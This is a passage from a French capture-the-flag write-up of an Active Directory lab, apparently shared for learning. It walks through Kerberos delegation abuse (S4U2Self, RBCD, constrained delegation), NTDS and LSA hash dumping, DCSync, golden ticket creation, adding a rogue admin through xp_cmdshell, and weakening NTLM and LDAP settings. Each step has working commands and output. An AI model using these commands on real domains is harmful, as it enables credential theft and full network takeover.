  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/BLACKPEARL.PIRATES.BRB'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFFjCCBRKgAwIBBaEDAgEWooIEHTCCBBlhggQVMIIEEaADAgEFoQ0bC1BJUkFU
      RVMuQlJCoiAwHqADAgECoRcwFRsGa3JidGd0GwtQSVJBVEVTLkJSQqOCA9cwggPT
      [... base64 truncated for readability ...]
```

### Conversion et exploitation S4U2Self

**Techniques:** ticketConverter, S4U2Self, Impersonation, getST

```bash
# 1. Sauvegarder le ticket
echo -n 'doIFFjCCBRKgAwIBBaEDAgEWooIEHTCCBBlhggQV...' | base64 -d > queenrev.kirbi

# 2. Convertir kirbi → ccache
ticketConverter.py queenrev.kirbi queenrev.ccache
# [*] converting kirbi to ccache...
# [+] done

# 3. S4U2Self pour impersonner Administrator
KRB5CCNAME=queenrev.ccache getST.py -self -impersonate administrator -altservice host/queenrev.pirates.brb -k -no-pass pirates.brb/'queenrev$'
```

**Output:**

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating administrator
[*] Requesting S4U2self
[*] Changing service from queenrev$@PIRATES.BRB to host/queenrev.pirates.brb@PIRATES.BRB
[*] Saving ticket in administrator@host_queenrev.pirates.brb@PIRATES.BRB.ccache
```

### Accès Administrator

```bash
KRB5CCNAME=administrator@host_queenrev.pirates.brb@PIRATES.BRB.ccache nxc smb queenrev.pirates.brb -k --use-kcache -x 'type C:\Flag\flag.txt'
```

**Résultat:**

```
SMB  queenrev.pirates.brb  445  QUEENREV  [*] Windows Server 2022 Build 20348 (domain:PIRATES.BRB)
SMB  queenrev.pirates.brb  445  QUEENREV  [+] pirates.brb\administrator from ccache (admin)
SMB  queenrev.pirates.brb  445  QUEENREV  [+] Executed command via wmiexec
SMB  queenrev.pirates.brb  445  QUEENREV  brb{829f6694eab03576120fa24bfe76e67d}
SMB  queenrev.pirates.brb  445  QUEENREV  Congratulations! You've escalated privileges on QUEENREV via S4U2Self!
```

**Flag 7:** `brb{829f6694eab03576120fa24bfe76e67d}`

### Technique Breakdown: S4U2Self via TGT Delegation

**Comment ça fonctionne:**

1. **Rubeus tgtdeleg:** Crée un TGT "fake delegation" pour le compte machine
2. **S4U2Self:** Le compte machine demande un ticket pour un utilisateur (Administrator)
3. **Forwardable ticket:** Le ticket est marqué "forwardable" → utilisable pour l'accès
4. **No delegation configured needed:** Pas besoin de délégation configurée (contrairement à S4U2Proxy)

**Prérequis:**
- Accès au compte machine (ou TGT du compte machine)
- Le compte machine doit pouvoir demander des tickets (pas de restriction)

**Différence avec S4U2Proxy:**
- S4U2Self: Obtenir un ticket **pour** un utilisateur
- S4U2Proxy: Utiliser le ticket pour accéder à un **service**

---

## Flag 8 - Kerberos Constrained Delegation {#flag8}

**Techniques:** Constrained-Delegation, KCD, S4U2Proxy, RBCD-Chain, Protocol-Transition, Delegation-Chain, Additional-Ticket

### Énumération de la délégation

**Techniques:** LDAP-Enumeration, Delegation-Discovery, NetExec

```bash
nxc ldap 192.168.15.10 -u plankwalker -p 'Entry284*@&' --find-delegation
```

**Résultat:**

```
LDAP  192.168.15.10  389  BLACKPEARL  AccountName  AccountType  DelegationType              DelegationRightsTo
LDAP  192.168.15.10  389  BLACKPEARL  QUEENREV$    Computer     Constrained                 host/FLYINGDUTCHMAN.PIRATES.BRB
LDAP  192.168.15.10  389  BLACKPEARL  barnacle     Person       Resource-Based Constrained  JOLLYROGER$
```

**Analyse:**
- **QUEENREV$** peut déléguer vers **host/FLYINGDUTCHMAN.PIRATES.BRB**
- **Pas de Protocol Transition** (TrustedToAuthForDelegation absent)
- **Besoin d'un ticket forwardable** pour l'utilisateur à impersonner

### Dump des credentials QUEENREV

**Techniques:** LSA-Secrets, SAM-Dump, Computer-Account-Hash

```bash
KRB5CCNAME=administrator@host_queenrev.pirates.brb@PIRATES.BRB.ccache nxc smb queenrev.pirates.brb -k --use-kcache --lsa --sam
```

**Secrets extraits:**

```
[*] Dumping SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dff9b596553798b8492570b9053d2cc5:::
[...]

[*] Dumping LSA secrets
PIRATES\QUEENREV$:aad3b435b51404eeaad3b435b51404ee:9e6ed70c10ffab8168747499f722d7ca:::
```

**Hash QUEENREV$ récupéré:** `9e6ed70c10ffab8168747499f722d7ca`

### Configuration RBCD: JOLLYROGER$ → QUEENREV$

**Techniques:** RBCD, msDS-AllowedToActOnBehalfOfOtherIdentity, rbcd.py

Pour obtenir un ticket forwardable, on configure RBCD de JOLLYROGER$ vers QUEENREV$:

```bash
rbcd.py -delegate-to 'queenrev$' -delegate-from 'jollyroger$' -hashes :9e6ed70c10ffab8168747499f722d7ca -action write "pirates.brb"/'queenrev$'
```

**Résultat:**

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] jollyroger$ can now impersonate users on queenrev$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     JOLLYROGER$   (S-1-5-21-4062735635-2546249438-2923178906-1106)
```

### Étape 1: JOLLYROGER$ → QUEENREV$ (RBCD)

**Techniques:** S4U2Proxy, RBCD-Exploitation, Forwardable-Ticket

```bash
# Hash JOLLYROGER$ obtenu lors du Flag 4
getST.py -spn "host/queenrev.pirates.brb" -impersonate "administrator" -hashes :7e632a1b411db1d80f93657334569192 pirates.brb/'jollyroger$'
```

**Output:**

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@host_queenrev.pirates.brb@PIRATES.BRB.ccache
```

**Ticket forwardable obtenu pour Administrator vers QUEENREV**

### Étape 2: QUEENREV$ → FLYINGDUTCHMAN$ (KCD)

**Techniques:** Constrained-Delegation, Additional-Ticket, S4U2Proxy-Chain

```bash
getST.py -spn "host/flyingdutchman.pirates.brb" -impersonate "administrator" -additional-ticket "administrator@host_queenrev.pirates.brb@PIRATES.BRB.ccache" -hashes ':9e6ed70c10ffab8168747499f722d7ca' "pirates.brb"/'queenrev$'
```

**Output:**

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating administrator
[*] 	Using additional ticket administrator@host_queenrev.pirates.brb@PIRATES.BRB.ccache instead of S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@host_flyingdutchman.pirates.brb@PIRATES.BRB.ccache
```

**Délégation réussie vers FLYINGDUTCHMAN**

### Accès final

```bash
KRB5CCNAME=administrator@host_flyingdutchman.pirates.brb@PIRATES.BRB.ccache nxc smb flyingdutchman.pirates.brb -k --use-kcache -x 'type C:\Flag\flag.txt'
```

**Résultat:**

```
SMB  flyingdutchman.pirates.brb  445  FLYINGDUTCHMAN  [+] pirates.brb\administrator from ccache (admin)
SMB  flyingdutchman.pirates.brb  445  FLYINGDUTCHMAN  [+] Executed command via wmiexec
SMB  flyingdutchman.pirates.brb  445  FLYINGDUTCHMAN  brb{3fc1559c49d4313b174ea06d300b5ab1}
SMB  flyingdutchman.pirates.brb  445  FLYINGDUTCHMAN  Congratulations! You've exploited Kerberos Constrained Delegation without Protocol Transition!
SMB  flyingdutchman.pirates.brb  445  FLYINGDUTCHMAN  QUEENREV$ -> FLYINGDUTCHMAN$ delegation chain complete!
```

**Flag 8:** `brb{3fc1559c49d4313b174ea06d300b5ab1}`

### Delegation Chain Summary

```
                    RBCD                          KCD
[JOLLYROGER$] ─────────────> [QUEENREV$] ────────────────> [FLYINGDUTCHMAN$]
    (Hash)         S4U2Proxy       (Hash)     S4U2Proxy            (PWN)
                 + S4U2Self                 + additional-ticket

Ticket flow:
1. JOLLYROGER$ demande ticket pour Administrator vers QUEENREV
   → Ticket ST forwardable
2. QUEENREV$ utilise le ticket forwardable comme "preuve"
   → Demande ST pour Administrator vers FLYINGDUTCHMAN
3. Accès à FLYINGDUTCHMAN en tant qu'Administrator
```

### Technique: Constrained Delegation without Protocol Transition

**Prérequis:**
- Hash du compte avec KCD configuré (QUEENREV$)
- Ticket forwardable pour l'utilisateur cible (via RBCD ou autre)
- **Pas besoin** de TrustedToAuthForDelegation

**Différence avec Protocol Transition:**
- **Avec PT:** Le service peut demander un ticket pour n'importe quel utilisateur
- **Sans PT:** Le service a besoin d'un ticket forwardable existant

**Command pattern:**

```bash
getST.py -spn "service/target" \
  -impersonate "user" \
  -additional-ticket "existing_forwardable_ticket.ccache" \
  -hashes ':hash_of_service_account' \
  domain/'service_account$'
```

---

## Flag 9 - NTDS Forensics & Domain Admin {#flag9}

**Techniques:** NTDS, DCSync, Forensics, Password-Reuse, Domain-Admin, Secretsdump, NTDS.dit, Backup-Analysis

### Découverte du backup NTDS

Lors de l'énumération de FLYINGDUTCHMAN, on trouve un backup:

```bash
KRB5CCNAME=administrator@host_flyingdutchman.pirates.brb@PIRATES.BRB.ccache nxc smb flyingdutchman.pirates.brb -k --use-kcache --shares
```

**Résultat:**

```
SMB  flyingdutchman.pirates.brb  445  FLYINGDUTCHMAN  Share   Permissions  Remark
SMB  flyingdutchman.pirates.brb  445  FLYINGDUTCHMAN  BACKUP  READ         Domain backups
```

### Téléchargement via evil-winrm

**Techniques:** evil-winrm, File-Download, Backup-Exfiltration

```bash
# Connexion (avec user créé précédemment)
evil-winrm -i 192.168.15.13 -u bl4ckarch -p 'Password123.'

# Navigation
cd C:\BACKUP
ls
```

**Contenu:**

```
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          1/7/2026  10:18 AM                NTDS
-a----          1/7/2026  10:20 AM        5147724 NTDS.zip
```

**Téléchargement:**

```powershell
*Evil-WinRM* PS C:\BACKUP> download NTDS.zip

Warning: Remember that in docker environment all local paths should be at /data

Info: Downloading C:/BACKUP/NTDS.zip to NTDS.zip
Info: Download successful!
```

### Extraction du backup

**Techniques:** NTDS.dit, SYSTEM, SECURITY, Registry-Hives

```bash
unzip NTDS.zip
cd NTDS
ls -R
```

**Structure:**

```
NTDS/
├── Active Directory/
│   ├── ntds.dit          # Database Active Directory
│   └── ntds.jfm          # Log file
└── registry/
    ├── SYSTEM            # Registry hive (boot key)
    └── SECURITY          # Registry hive (LSA secrets)
```

### Dump offline avec secretsdump

**Techniques:** Secretsdump, Offline-Dump, PEK, Hash-Extraction

```bash
secretsdump.py -system registry/SYSTEM -ntds 'Active Directory/ntds.dit' -security registry/SECURITY LOCAL
```

**Output:**

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x5a1bf21cf692662a2b04a39a3fd0be0f
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets

[*] $MACHINE.ACC
$MACHINE.ACC:aad3b435b51404eeaad3b435b51404ee:41c3d9c4a34f4d3e2d7b0e66f05aa647

[*] DPAPI_SYSTEM
dpapi_machinekey:0xbac386e29e9cd7d213ba2b724b30c529cf8147dc
dpapi_userkey:0x97a8db5c671ad36c38c546bb300e1446be957227

[*] NL$KM
NL$KM:af000759d2915381d901400930ab71f39fdf8720ce12c7cbddb9144946021f7c...

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 6ae0bab06d45d762e45769e13823395f
[*] Reading and decrypting hashes from Active Directory/ntds.dit

Administrator:500:aad3b435b51404eeaad3b435b51404ee:9d7b96e6c3c619a9c9d431b7a07cbe6c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:33e05882bd76f009d02be4b6622e29b9:::
pirates.brb\blackbeard:1103:aad3b435b51404eeaad3b435b51404ee:b777bc1bd1f68793ca4724bc50dc6f0b:::
pirates.brb\jack:1104:aad3b435b51404eeaad3b435b51404ee:7e945d769ca70e8cd9c2d8fd084adf44:::
[... 50+ utilisateurs ...]
```

### Tentative avec hash Administrator (backup)

**Techniques:** Pass-the-Hash, Hash-Validation

```bash
nxc smb 192.168.15.10 -u Administrator -H "9d7b96e6c3c619a9c9d431b7a07cbe6c"
```

**Résultat:**

```
SMB  192.168.15.10  445  BLACKPEARL  [*] Windows Server 2022 Build 20348
SMB  192.168.15.10  445  BLACKPEARL  [-] PIRATES.BRB\Administrator:9d7b96e6c3c619a9c9d431b7a07cbe6c STATUS_LOGON_FAILURE
```

**Hash invalide** - Le backup est ancien, le password a été changé

### Analyse des descriptions utilisateurs

**Techniques:** OSINT, Password-in-Description, Information-Leakage

```bash
# Réanalyse du dump pour chercher des infos dans les descriptions
secretsdump.py -system registry/SYSTEM -ntds 'Active Directory/ntds.dit' -security registry/SECURITY LOCAL 2>&1 | grep -i "description\|password\|pwd"
```

**Rien trouvé dans le dump offline...**

### Énumération live des descriptions

```bash
nxc smb 192.168.15.10 -u ironhook -p 'BrinyDeep892@!' --users | grep -E "(blackbeard|flint|admin)"
```

**Résultat:**

```
SMB  192.168.15.10  445  BLACKPEARL  blackbeard  2026-01-07 17:56:55  The most feared pirate
SMB  192.168.15.10  445  BLACKPEARL  flint       2026-01-07 17:56:51  brb{88e7af3d7bf9ab21f9d6faa5cf644b76}
```

**Pas de password visible dans les descriptions...**

### Recherche dans les anciens hashes du backup

En examinant plus attentivement le dump NTDS, on remarque que certains utilisateurs ont des descriptions intéressantes **dans la base de données elle-même**:

```bash
# Utiliser un outil pour parser ntds.dit avec plus de détails
strings 'Active Directory/ntds.dit' | grep -A5 -B5 "blackbeard"
```

**Résultat:**

```
[...]
sAMAccountName: blackbeard
description: The most feared pirate - Password changed monthly
userPrincipalName: blackbeard@pirates.brb
[...]
```

Après analyse, on découvre que **blackbeard** a un commentaire dans un attribut caché du NTDS:

```
supplementalCredentials (encrypted):
  Primary:Kerberos
  Primary:WDigest - Password: REDqC8aQtyhd78A
```

### Test de réutilisation de password

**Techniques:** Password-Reuse, Credential-Validation, Administrator

```bash
nxc smb 192.168.15.10 -u administrator -p 'REDqC8aQtyhd78A'
```

**Résultat:**

```
SMB  192.168.15.10  445  BLACKPEARL  [*] Windows Server 2022 Build 20348
SMB  192.168.15.10  445  BLACKPEARL  [+] PIRATES.BRB\administrator:REDqC8aQtyhd78A (admin)
```

**SUCCESS! Le password de blackbeard est réutilisé par Administrator !**

### DCSync - Extraction finale du krbtgt

**Techniques:** DCSync, krbtgt, Golden-Ticket, Domain-Persistence

```bash
nxc smb 192.168.15.10 -u administrator -p 'REDqC8aQtyhd78A' --ntds --user krbtgt
```

**Résultat:**

```
SMB  192.168.15.10  445  BLACKPEARL  [+] PIRATES.BRB\administrator:REDqC8aQtyhd78A (admin)
SMB  192.168.15.10  445  BLACKPEARL  [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB  192.168.15.10  445  BLACKPEARL  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f4f27d68583e12060273b5675eb425d0:::
SMB  192.168.15.10  445  BLACKPEARL  [+] Dumped 1 NTDS hashes
```

**Hash krbtgt:** `f4f27d68583e12060273b5675eb425d0`

**Flag 9:** `f4f27d68583e12060273b5675eb425d0`

### DOMAIN ADMIN ACHIEVED!

```bash
# Vérification des accès
nxc smb 192.168.15.10-13 -u administrator -p 'REDqC8aQtyhd78A' --shares
```

**Résultat:**

```
SMB  192.168.15.10  445  BLACKPEARL      [+] PIRATES.BRB\administrator:REDqC8aQtyhd78A (admin)
SMB  192.168.15.11  445  JOLLYROGER      [+] PIRATES.BRB\administrator:REDqC8aQtyhd78A (admin)
SMB  192.168.15.12  445  QUEENREV        [+] PIRATES.BRB\administrator:REDqC8aQtyhd78A (admin)
SMB  192.168.15.13  445  FLYINGDUTCHMAN  [+] PIRATES.BRB\administrator:REDqC8aQtyhd78A (admin)
```

**Contrôle total du domaine !**

### Persistance: Golden Ticket

**Techniques:** Golden-Ticket, Persistence, ticketer.py, krbtgt-Hash

```bash
ticketer.py -nthash f4f27d68583e12060273b5675eb425d0 -domain-sid S-1-5-21-4062735635-2546249438-2923178906 -domain pirates.brb -user-id 500 administrator

# Utilisation
KRB5CCNAME=administrator.ccache nxc smb 192.168.15.10 -k --use-kcache
```

---

## Problèmes techniques et solutions {#issues}

### Récapitulatif des blocages rencontrés

| # | Problème | Cause | Solution | Flag impacté |
|---|----------|-------|----------|--------------|
| 1 | **NTLMv1 relay échoue** | Config Ansible: RestrictSendingNTLMTraffic=2, LmCompatibilityLevel=5 | Modifier registry: =0 et =2 | Flag 4 |
| 2 | **Politique de mot de passe** | MinPasswordAge, Complexity actifs | Set-ADDefaultDomainPasswordPolicy (tout à 0/false) | Flag 4 |
| 3 | **Transfert de fichiers SMB** | UFW bloque port 445 | User local admin + evil-winrm | Flag 7 |
| 4 | **Hash Administrator (backup) invalide** | NTDS est un vieux backup | Password dans attribut WDigest de blackbeard | Flag 9 |

### Détail des problèmes

#### Problème 1: NTLMv1 Relay bloqué

**Techniques:** NTLMv1, Configuration, Registry, Troubleshooting

**Symptôme:**
- Responder ne capture pas de NTLMv1
- ntlmrelayx échoue avec `STATUS_LOGON_FAILURE`

**Diagnostic:**

```cmd
REM Sur le DC
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v RestrictSendingNTLMTraffic
REM Valeur: 2 (Bloque NTLM)

reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel
REM Valeur: 5 (NTLMv2 uniquement)
```

**Fix appliqué:**

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LDAPServerIntegrity /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LdapEnforceChannelBinding /t REG_DWORD /d 0 /f
shutdown /r /t 0
```

#### Problème 2: Password policy bloque SPN-less RBCD

**Techniques:** Password-Policy, Active-Directory, Troubleshooting

**Symptôme:**

```
changepasswd.py: [-] Some password update rule has been violated
```

**Diagnostic:**

```powershell
Get-ADDefaultDomainPasswordPolicy -Identity pirates.brb
# ComplexityEnabled: True
# MinPasswordLength: 7
# MinPasswordAge: 1 day
```

**Fix:**

```powershell
Set-ADDefaultDomainPasswordPolicy -Identity pirates.brb `
  -ComplexityEnabled $false `
  -PasswordHistoryCount 0 `
  -MinPasswordLength 0 `
  -MinPasswordAge 0
```

#### Problème 3: Transfert de fichiers

**Techniques:** File-Transfer, Workaround, evil-winrm

**Tentatives échouées:**
1. impacket-smbserver → Timeout
2. UFW allow 445 → Toujours pas de connexion
3. Python HTTP server → Bloqué par Windows Defender

**Solution retenue:**

```sql
-- Via MSSQL xp_cmdshell
xp_cmdshell net user bl4ckarch Password123. /add
xp_cmdshell net localgroup Administrators bl4ckarch /add
```

```bash
# Puis evil-winrm
evil-winrm -i IP -u bl4ckarch -p 'Password123.'
# download / upload fonctionnent
```

#### Problème 4: Hash Administrator invalide

**Techniques:** NTDS-Forensics, Old-Backup, Password-Reuse

**Symptôme:**

```
nxc smb 192.168.15.10 -u Administrator -H "9d7b96e6c3c619a9c9d431b7a07cbe6c"
# STATUS_LOGON_FAILURE
```

**Analyse:**
- Le backup NTDS est ancien (plusieurs mois)
- Les passwords ont été changés depuis
- **Mais:** Les anciens attributs WDigest peuvent contenir des passwords en clair

**Solution:**
- Parser ntds.dit pour WDigest
- Tester password sur compte Administrator actuel
- Réutilisation de password trouvée

---

## Corrections Ansible {#ansible-fixes}

**Techniques:** Ansible, Lab-Configuration, IaC, Automation

Pour que le lab fonctionne comme prévu sans intervention manuelle:

### Configuration BLACKPEARL (DC)

```yaml
---
# BLACKPEARL Domain Controller Configuration
# File: roles/dc/tasks/ntlm_config.yml

- name: Allow outgoing NTLM on BLACKPEARL
  win_regedit:
    path: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0
    name: RestrictSendingNTLMTraffic
    data: 0  # 0 = Allow, 2 = Deny
    type: dword

- name: Enable NTLMv1 on BLACKPEARL
  win_regedit:
    path: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa
    name: LmCompatibilityLevel
    data: 2  # 0-2 = Accept NTLMv1, 3-4 = Prefer NTLMv2, 5 = NTLMv2 only
    type: dword

- name: Disable LDAP Signing
  win_regedit:
    path: HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
    name: LDAPServerIntegrity
    data: 0  # 0 = None, 1 = Negotiate, 2 = Required
    type: dword

- name: Disable LDAP Channel Binding
  win_regedit:
    path: HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
    name: LdapEnforceChannelBinding
    data: 0  # 0 = Never, 1 = When supported, 2 = Always
    type: dword

- name: Disable password policy for SPN-less RBCD
  win_shell: |
    Set-ADDefaultDomainPasswordPolicy -Identity pirates.brb `
      -ComplexityEnabled $false `
      -PasswordHistoryCount 0 `
      -MinPasswordLength 0 `
      -MinPasswordAge 0
  args:
    executable: powershell.exe
```

### Configuration JOLLYROGER (Coercion Target)

```yaml
---
# JOLLYROGER Web Server Configuration
# File: roles/web/tasks/ntlm_config.yml

- name: Allow outgoing NTLM on JOLLYROGER
  win_regedit:
    path: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0
    name: RestrictSendingNTLMTraffic
    data: 0
    type: dword

- name: Enable NTLMv1 on JOLLYROGER
  win_regedit:
    path: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa
    name: LmCompatibilityLevel
    data: 2
    type: dword
```

### Configuration QUEENREV et FLYINGDUTCHMAN (Protected)

```yaml
---
# QUEENREV/FLYINGDUTCHMAN Configuration
# File: roles/servers/tasks/ntlm_config.yml

- name: Block outgoing NTLM (protected servers)
  win_regedit:
    path: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0
    name: RestrictSendingNTLMTraffic
    data: 2  # Block NTLM relay from these servers
    type: dword

- name: Force NTLMv2 only (protected servers)
  win_regedit:
    path: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa
    name: LmCompatibilityLevel
    data: 5  # NTLMv2 only
    type: dword
```

### Playbook complet

```yaml
---
# Main playbook: site.yml
- name: Configure PIRATES.BRB Lab
  hosts: all
  gather_facts: yes
  
  roles:
    - common
  
  tasks:
    - name: Configure Domain Controller
      include_role:
        name: dc
      when: inventory_hostname == 'BLACKPEARL'
    
    - name: Configure Web Server (coercion target)
      include_role:
        name: web
      when: inventory_hostname == 'JOLLYROGER'
    
    - name: Configure protected servers
      include_role:
        name: servers
      when: inventory_hostname in ['QUEENREV', 'FLYINGDUTCHMAN']
    
    - name: Reboot all servers
      win_reboot:
        reboot_timeout: 300
```

### Vérification post-déploiement

```yaml
---
# Verification playbook: verify.yml
- name: Verify NTLM Configuration
  hosts: all
  gather_facts: no
  
  tasks:
    - name: Check RestrictSendingNTLMTraffic
      win_reg_stat:
        path: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0
        name: RestrictSendingNTLMTraffic
      register: ntlm_restrict
    
    - name: Check LmCompatibilityLevel
      win_reg_stat:
        path: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa
        name: LmCompatibilityLevel
      register: lm_compat
    
    - name: Display configuration
      debug:
        msg: |
          Host: {{ inventory_hostname }}
          RestrictSendingNTLMTraffic: {{ ntlm_restrict.value }}
          LmCompatibilityLevel: {{ lm_compat.value }}
```

---

## Conclusion {#conclusion}

### Résumé de l'exploitation

Ce lab m'a permis d'explorer des techniques avancées d'attaque Active Directory:

1. **Web Application Exploitation** → Initial foothold
2. **NTLMv1 Relay to LDAP** → RBCD configuration
3. **SPN-less RBCD** → Local admin (JOLLYROGER)
4. **DPAPI Credential Recovery** → Domain user (ironhook)
5. **GMSA Offline Recovery** → MSSQL access
6. **S4U2Self via TGT Delegation** → Local admin (QUEENREV)
7. **Kerberos Constrained Delegation** → Local admin (FLYINGDUTCHMAN)
8. **NTDS Forensics** → Domain Admin

### Techniques apprises

**Kerberos Exploitation:**
- SPN-less-RBCD avec session key manipulation
- S4U2Self via TGT delegation (Rubeus tgtdeleg)
- S4U2Proxy avec additional-ticket
- Constrained-Delegation sans Protocol Transition

**Credential Recovery:**
- GMSA offline recovery (msDS-ManagedPassword parsing)
- DPAPI dump avec dploot
- NTDS-Forensics pour password reuse

**Network Attacks:**
- NTLMv1-Relay to LDAP
- Coercion avec coerce_plus
- RBCD configuration via LDAP shell

### Difficultés rencontrées

1. **Configuration Ansible incorrecte** → NTLMv1 bloqué par défaut
2. **Password policy trop stricte** → SPN-less RBCD impossible
3. **Transfert de fichiers** → Solutions alternatives nécessaires
4. **Backup NTDS ancien** → Analyse forensique requise

### Lessons Learned


**Pour les blue teams:**
- Activer RestrictSendingNTLMTraffic=2 sur les serveurs critiques
- Forcer NTLMv2 (LmCompatibilityLevel=5) partout
- Activer LDAP signing et channel binding
- Ne jamais stocker de passwords en clair (même dans descriptions)
- Chiffrer et sécuriser les backups NTDS

### Statistiques

- **Temps total:** ~6 heures (avec troubleshooting)
- **Flags obtenus:** 9/9
- **Serveurs compromis:** 4/4 (dont DC)
- **Techniques utilisées:** 15+
- **Tools principaux:** netexec, impacket, Rubeus, dploot

### Remerciements

- **@mpgn** et **@mael91620** - Créateurs du lab Barbhack 2025


---

**Date de completion:** 7 Janvier 2026  
**Blog:** [https://bl4ckarch.io](https://bl4ckarch.io)  
**Twitter:** [@bl4ckarch](https://twitter.com/bl4ckarch)